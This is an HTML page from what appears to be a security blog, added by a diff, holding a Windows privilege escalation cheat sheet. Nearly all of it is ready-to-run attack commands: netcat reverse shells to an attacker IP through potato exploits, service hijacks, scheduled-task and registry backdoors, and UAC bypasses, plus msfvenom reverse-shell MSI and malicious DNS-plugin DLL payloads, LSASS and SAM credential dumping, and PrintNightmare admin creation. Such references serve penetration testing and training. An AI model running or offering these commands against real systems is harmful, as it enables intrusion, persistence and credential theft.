@@ -1,0 +1,358 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Windows-Privilege-Escalation"><a href="#Windows-Privilege-Escalation" class="headerlink" title="Windows Privilege Escalation"></a>Windows Privilege Escalation</h1><p>Escalate privileges on Windows systems through misconfigurations, vulnerable services, weak permissions, token abuse, and kernel exploits.<br>This phase follows initial access and aims to gain SYSTEM or Administrator-level access for further domain compromise.</p>
+<h2 id="Enumeration-Tools"><a href="#Enumeration-Tools" class="headerlink" title="Enumeration Tools"></a>Enumeration Tools</h2><h3 id="WinPEAS"><a href="#WinPEAS" class="headerlink" title="WinPEAS"></a>WinPEAS</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download and run</span></span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">10.10</span>.<span class="number">14.5</span>/winPEASx64.exe <span class="literal">-O</span> winPEAS.exe</span><br><span class="line">.\winPEAS.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Run all checks</span></span><br><span class="line">.\Seatbelt.exe all</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run specific checks</span></span><br><span class="line">.\Seatbelt.exe user</span><br><span class="line">.\Seatbelt.exe nonstandardServices</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Import and run all checks</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="SharpUp"><a href="#SharpUp" class="headerlink" title="SharpUp"></a>SharpUp</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># C# version of PowerUp</span><br><span class="line">.\SharpUp.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Watson-Patch-Level"><a href="#Watson-Patch-Level" class="headerlink" title="Watson (Patch Level)"></a>Watson (Patch Level)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Enumerate missing KBs and suggest exploits</span><br><span class="line">.\Watson.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="AccessChk-Sysinternals"><a href="#AccessChk-Sysinternals" class="headerlink" title="AccessChk (Sysinternals)"></a>AccessChk (Sysinternals)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check service permissions</span><br><span class="line">.\accesschk64.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line"></span><br><span class="line"># Check directory permissions</span><br><span class="line">.\accesschk64.exe /accepteula -s -d C:\Scripts\</span><br><span class="line"></span><br><span class="line"># Check service permissions</span><br><span class="line">.\PsService.exe security &lt;service_name&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Token-Privileges-Abuse"><a href="#Token-Privileges-Abuse" class="headerlink" title="Token Privileges Abuse"></a>Token Privileges Abuse</h2><h3 id="SeImpersonatePrivilege-SeAssignPrimaryTokenPrivilege"><a href="#SeImpersonatePrivilege-SeAssignPrimaryTokenPrivilege" class="headerlink" title="SeImpersonatePrivilege &#x2F; SeAssignPrimaryTokenPrivilege"></a>SeImpersonatePrivilege &#x2F; SeAssignPrimaryTokenPrivilege</h3><h4 id="Check-Current-Privileges"><a href="#Check-Current-Privileges" class="headerlink" title="Check Current Privileges"></a>Check Current Privileges</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
+
+<h4 id="PrintSpoofer-Windows-Server-2019-Windows-10-1809"><a href="#PrintSpoofer-Windows-Server-2019-Windows-10-1809" class="headerlink" title="PrintSpoofer (Windows Server 2019 &#x2F; Windows 10 1809+)"></a>PrintSpoofer (Windows Server 2019 &#x2F; Windows 10 1809+)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check <span class="keyword">if</span> <span class="built_in">Print</span> Spooler is running</span><br><span class="line">ls \\localhost\pipe\spoolss</span><br><span class="line"></span><br><span class="line"># Reverse shell</span><br><span class="line">.\printspoofer.exe -i -c &quot;C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot;</span><br><span class="line"></span><br><span class="line"># From SQL xp_cmdshell</span><br><span class="line">EXEC xp_cmdshell &#x27;C:\Users\Public\printspoofer.exe -i -c &quot;C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="JuicyPotato-Windows-Server-2016-and-earlier"><a href="#JuicyPotato-Windows-Server-2016-and-earlier" class="headerlink" title="JuicyPotato (Windows Server 2016 and earlier)"></a>JuicyPotato (Windows Server 2016 and earlier)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Get CLSID <span class="keyword">for</span> your OS version from JuicyPotato repo</span><br><span class="line"># https://github.com/ohpe/juicy-potato/<span class="built_in">tree</span>/master/CLSID</span><br><span class="line"></span><br><span class="line"># Execute with CLSID</span><br><span class="line">.\JuicyPotato.exe -l <span class="number">4001</span> -p c:\windows\system32\<span class="built_in">cmd</span>.exe -c &#123;<span class="number">4661626</span>C-<span class="number">9</span>F41-<span class="number">40</span>A9-B3F5-<span class="number">5580</span>E80CB347&#125; -a &quot;/c C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">8443</span> -e <span class="built_in">cmd</span>.exe&quot; -t *</span><br></pre></td></tr></table></figure>
+
+<h4 id="RoguePotato-Alternative-for-2019"><a href="#RoguePotato-Alternative-for-2019" class="headerlink" title="RoguePotato (Alternative for 2019+)"></a>RoguePotato (Alternative for 2019+)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">.\RoguePotato.exe -r <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> -e &quot;C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot; -l <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="SeDebugPrivilege"><a href="#SeDebugPrivilege" class="headerlink" title="SeDebugPrivilege"></a>SeDebugPrivilege</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Allows attaching to any process and reading memory</span></span><br><span class="line"><span class="comment"># Can dump LSASS for credentials</span></span><br><span class="line">procdump.exe <span class="literal">-accepteula</span> <span class="literal">-ma</span> lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<h3 id="SeTakeOwnershipPrivilege"><a href="#SeTakeOwnershipPrivilege" class="headerlink" title="SeTakeOwnershipPrivilege"></a>SeTakeOwnershipPrivilege</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Take ownership of sensitive files</span><br><span class="line">takeown /f C:\Windows\System32\config\SAM</span><br><span class="line">icacls C:\Windows\System32\config\SAM /grant <span class="variable">%username%</span>:F</span><br></pre></td></tr></table></figure>
+
+<h2 id="Privileged-Groups-Abuse"><a href="#Privileged-Groups-Abuse" class="headerlink" title="Privileged Groups Abuse"></a>Privileged Groups Abuse</h2><h3 id="DNS-Admins-Group"><a href="#DNS-Admins-Group" class="headerlink" title="DNS Admins Group"></a>DNS Admins Group</h3><h4 id="Check-Group-Membership"><a href="#Check-Group-Membership" class="headerlink" title="Check Group Membership"></a>Check Group Membership</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user &lt;username&gt; /dom</span><br></pre></td></tr></table></figure>
+
+<h4 id="Check-DNS-Service-Permissions"><a href="#Check-DNS-Service-Permissions" class="headerlink" title="Check DNS Service Permissions"></a>Check DNS Service Permissions</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">.\PsService.exe security DNS</span><br></pre></td></tr></table></figure>
+
+<h4 id="Generate-Malicious-DLL"><a href="#Generate-Malicious-DLL" class="headerlink" title="Generate Malicious DLL"></a>Generate Malicious DLL</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On attacker machine</span></span><br><span class="line">msfvenom -p windows/x64/exec cmd=<span class="string">&#x27;net group &quot;domain admins&quot; netadm /add /domain&#x27;</span> -f dll -o adduser.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># Serve via SMB</span></span><br><span class="line">smbserver.py -smb2support share $(<span class="built_in">pwd</span>) -username user -password pass</span><br></pre></td></tr></table></figure>
+
+<h4 id="Configure-DNS-to-Load-DLL"><a href="#Configure-DNS-to-Load-DLL" class="headerlink" title="Configure DNS to Load DLL"></a>Configure DNS to Load DLL</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">Copy</span> DLL locally</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span>\share\adduser.dll C:\Users\Public\Temp\</span><br><span class="line"></span><br><span class="line"># Point DNS to malicious DLL (local <span class="built_in">path</span>)</span><br><span class="line">dnscmd.exe /config /serverlevelplugindll C:\Users\Public\Temp\adduser.dll</span><br><span class="line"></span><br><span class="line"># Or use UNC <span class="built_in">path</span> (requires DC machine account access to share)</span><br><span class="line">dnscmd.exe /config /serverlevelplugindll \\fileserver\share\adduser.dll</span><br><span class="line"></span><br><span class="line"># Restart DNS service</span><br><span class="line">sc.exe stop DNS</span><br><span class="line">sc.exe <span class="built_in">start</span> DNS</span><br><span class="line"></span><br><span class="line"># <span class="built_in">Verify</span> user added to Domain Admins</span><br><span class="line"><span class="built_in">net</span> group &quot;Domain Admins&quot; /dom</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check registry key</span><br><span class="line">reg query \\&lt;dc&gt;\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters</span><br><span class="line"></span><br><span class="line"># Delete malicious DLL <span class="built_in">path</span></span><br><span class="line">reg delete \\&lt;dc&gt;\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll</span><br><span class="line"></span><br><span class="line"># Restart DNS</span><br><span class="line">sc.exe <span class="built_in">start</span> dns</span><br></pre></td></tr></table></figure>
+
+<h3 id="Backup-Operators"><a href="#Backup-Operators" class="headerlink" title="Backup Operators"></a>Backup Operators</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Can backup SAM/SYSTEM hives</span><br><span class="line">reg save HKLM\SAM C:\Temp\SAM</span><br><span class="line">reg save HKLM\SYSTEM C:\Temp\SYSTEM</span><br><span class="line"></span><br><span class="line"># Extract hashes offline</span><br><span class="line">secretsdump.py -sam SAM -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hyper-V-Administrators"><a href="#Hyper-V-Administrators" class="headerlink" title="Hyper-V Administrators"></a>Hyper-V Administrators</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Can create/modify VMs and access virtual disks</span></span><br><span class="line"><span class="comment"># Mount VHDX files to access file systems</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Print-Operators"><a href="#Print-Operators" class="headerlink" title="Print Operators"></a>Print Operators</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Can load printer drivers (similar to DNS Admins)</span><br><span class="line"># Can manage printers and <span class="built_in">print</span> servers</span><br></pre></td></tr></table></figure>
+
+<h3 id="Server-Operators"><a href="#Server-Operators" class="headerlink" title="Server Operators"></a>Server Operators</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Can <span class="built_in">start</span>/stop services</span><br><span class="line"># Modify service binpath to execute commands</span><br><span class="line">sc.exe config &lt;service&gt; binpath= &quot;C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot;</span><br><span class="line">sc.exe <span class="built_in">start</span> &lt;service&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Service-Misconfigurations"><a href="#Service-Misconfigurations" class="headerlink" title="Service Misconfigurations"></a>Service Misconfigurations</h2><h3 id="Unquoted-Service-Paths"><a href="#Unquoted-Service-Paths" class="headerlink" title="Unquoted Service Paths"></a>Unquoted Service Paths</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">Find</span> unquoted paths</span><br><span class="line">wmic service get name,pathname,displayname,startmode | <span class="built_in">findstr</span> /i auto | <span class="built_in">findstr</span> /i /v &quot;C:\Windows\\&quot; | <span class="built_in">findstr</span> /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># Check write permissions on <span class="built_in">path</span></span><br><span class="line">.\accesschk64.exe /accepteula -uwdq &quot;C:\Program Files\Some Folder\&quot;</span><br><span class="line"></span><br><span class="line"># Place malicious executable</span><br><span class="line"><span class="built_in">copy</span> nc.exe &quot;C:\Program Files\Some.exe&quot;</span><br><span class="line"></span><br><span class="line"># Restart service</span><br><span class="line">sc.exe stop &lt;service&gt;</span><br><span class="line">sc.exe <span class="built_in">start</span> &lt;service&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Weak-Service-Permissions"><a href="#Weak-Service-Permissions" class="headerlink" title="Weak Service Permissions"></a>Weak Service Permissions</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check service permissions</span><br><span class="line">.\accesschk64.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line"></span><br><span class="line"># Modify service binary <span class="built_in">path</span></span><br><span class="line">sc.exe config &lt;service&gt; binpath= &quot;C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot;</span><br><span class="line"></span><br><span class="line"># <span class="built_in">Start</span> service</span><br><span class="line">sc.exe <span class="built_in">start</span> &lt;service&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Weak-Service-Binary-Permissions"><a href="#Weak-Service-Binary-Permissions" class="headerlink" title="Weak Service Binary Permissions"></a>Weak Service Binary Permissions</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># <span class="built_in">Find</span> writable service binaries</span><br><span class="line">.\accesschk64.exe /accepteula -quvw &quot;C:\Program Files\*&quot;</span><br><span class="line"></span><br><span class="line"># <span class="built_in">Replace</span> binary with malicious one</span><br><span class="line"><span class="built_in">move</span> C:\Program Files\Service\service.exe service.exe.bak</span><br><span class="line"><span class="built_in">copy</span> nc.exe &quot;C:\Program Files\Service\service.exe&quot;</span><br><span class="line"></span><br><span class="line"># Restart service</span><br><span class="line">sc.exe stop &lt;service&gt;</span><br><span class="line">sc.exe <span class="built_in">start</span> &lt;service&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><h3 id="Enumerate-Scheduled-Tasks"><a href="#Enumerate-Scheduled-Tasks" class="headerlink" title="Enumerate Scheduled Tasks"></a>Enumerate Scheduled Tasks</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># List all tasks</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"># PowerShell enumeration</span><br><span class="line">Get-ScheduledTask | select TaskName,State</span><br></pre></td></tr></table></figure>
+
+<h3 id="Check-Script-Permissions"><a href="#Check-Script-Permissions" class="headerlink" title="Check Script Permissions"></a>Check Script Permissions</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check <span class="keyword">if</span> scripts directory is writable</span><br><span class="line">.\accesschk64.exe /accepteula -s -d C:\Scripts\</span><br><span class="line"></span><br><span class="line"># <span class="built_in">Append</span> malicious code to existing script</span><br><span class="line"><span class="built_in">echo</span> C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe &gt;&gt; C:\Scripts\backup.ps1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Registry-Exploits"><a href="#Registry-Exploits" class="headerlink" title="Registry Exploits"></a>Registry Exploits</h2><h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check <span class="keyword">if</span> enabled</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line"># Generate malicious MSI</span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> LPORT=<span class="number">4444</span> -f msi -o shell.msi</span><br><span class="line"></span><br><span class="line"># Install MSI (runs as SYSTEM)</span><br><span class="line">msiexec /quiet /qn /i C:\Users\Public\shell.msi</span><br></pre></td></tr></table></figure>
+
+<h3 id="Autorun-Registry-Keys"><a href="#Autorun-Registry-Keys" class="headerlink" title="Autorun Registry Keys"></a>Autorun Registry Keys</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check autorun locations</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># Add malicious entry</span><br><span class="line">reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="UAC-Bypass"><a href="#UAC-Bypass" class="headerlink" title="UAC Bypass"></a>UAC Bypass</h2><h3 id="Check-UAC-Status"><a href="#Check-UAC-Status" class="headerlink" title="Check UAC Status"></a>Check UAC Status</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check <span class="keyword">if</span> UAC is enabled</span><br><span class="line">REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA</span><br><span class="line"></span><br><span class="line"># Check UAC level</span><br><span class="line">REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin</span><br><span class="line"></span><br><span class="line"># Check current integrity level</span><br><span class="line">whoami /groups | <span class="built_in">findstr</span> &quot;Mandatory <span class="built_in">Label</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Check-Windows-Version"><a href="#Check-Windows-Version" class="headerlink" title="Check Windows Version"></a>Check Windows Version</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">environment</span>]::OSVersion.Version</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fodhelper-Bypass-Win10-RS1-22H2"><a href="#Fodhelper-Bypass-Win10-RS1-22H2" class="headerlink" title="Fodhelper Bypass (Win10 RS1 - 22H2)"></a>Fodhelper Bypass (Win10 RS1 - 22H2)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Manual method</span><br><span class="line"><span class="built_in">set</span> REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">CMD</span>=&quot;powershell -windowstyle hidden C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot;</span><br><span class="line">reg add <span class="variable">%REG_KEY%</span> /v &quot;DelegateExecute&quot; /d &quot;&quot; /f</span><br><span class="line">reg add <span class="variable">%REG_KEY%</span> /d <span class="variable">%CMD%</span> /f</span><br><span class="line">fodhelper.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PowerShell script method</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\FodhelperUACBypass.ps1</span><br><span class="line">FodhelperUACBypass <span class="literal">-program</span> <span class="string">&quot;cmd /c start powershell.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="WSReset-Bypass-Win10-RS1-21H2"><a href="#WSReset-Bypass-Win10-RS1-21H2" class="headerlink" title="WSReset Bypass (Win10 RS1 - 21H2)"></a>WSReset Bypass (Win10 RS1 - 21H2)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Similar to fodhelper</span><br><span class="line"><span class="built_in">set</span> REG_KEY=HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command</span><br><span class="line">reg add <span class="variable">%REG_KEY%</span> /v &quot;DelegateExecute&quot; /d &quot;&quot; /f</span><br><span class="line">reg add <span class="variable">%REG_KEY%</span> /d &quot;C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot; /f</span><br><span class="line">WSReset.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="SDCLT-Bypass-Win10-RS1-RS5"><a href="#SDCLT-Bypass-Win10-RS1-RS5" class="headerlink" title="SDCLT Bypass (Win10 RS1 - RS5)"></a>SDCLT Bypass (Win10 RS1 - RS5)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d &quot;C:\Users\Public\nc.exe <span class="number">10</span>.<span class="number">10</span>.<span class="number">14</span>.<span class="number">5</span> <span class="number">4444</span> -e <span class="built_in">cmd</span>.exe&quot; /f</span><br><span class="line">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /v &quot;DelegateExecute&quot; /f</span><br><span class="line">sdclt.exe /KickOffElev</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h2><h3 id="Enumerate-Patch-Level"><a href="#Enumerate-Patch-Level" class="headerlink" title="Enumerate Patch Level"></a>Enumerate Patch Level</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check installed patches</span><br><span class="line">wmic qfe list</span><br><span class="line"></span><br><span class="line"># Check OS version</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On attacker machine</span></span><br><span class="line">python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="PrintNightmare-CVE-2021-1675-CVE-2021-34527"><a href="#PrintNightmare-CVE-2021-1675-CVE-2021-34527" class="headerlink" title="PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)"></a>PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check if Print Spooler is running</span></span><br><span class="line"><span class="built_in">ls</span> \\localhost\pipe\spoolss</span><br><span class="line"></span><br><span class="line"><span class="comment"># PowerShell PoC (adds local admin)</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\CVE<span class="literal">-2021-1675</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-Nightmare</span> <span class="literal">-NewUser</span> <span class="string">&quot;hacker&quot;</span> <span class="literal">-NewPassword</span> <span class="string">&quot;Pwnd1234!&quot;</span> <span class="literal">-DriverName</span> <span class="string">&quot;PrintIt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Verify user created</span></span><br><span class="line">net user hacker</span><br></pre></td></tr></table></figure>
+
+<h3 id="HiveNightmare-CVE-2021-36934"><a href="#HiveNightmare-CVE-2021-36934" class="headerlink" title="HiveNightmare (CVE-2021-36934)"></a>HiveNightmare (CVE-2021-36934)</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Check <span class="keyword">if</span> vulnerable</span><br><span class="line">icacls C:\Windows\System32\config\SAM</span><br><span class="line"></span><br><span class="line"># <span class="built_in">Copy</span> SAM/SYSTEM hives</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\config\SAM C:\Users\Public\SAM</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM</span><br><span class="line"></span><br><span class="line"># Extract hashes</span><br><span class="line">secretsdump.py -sam SAM -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
+
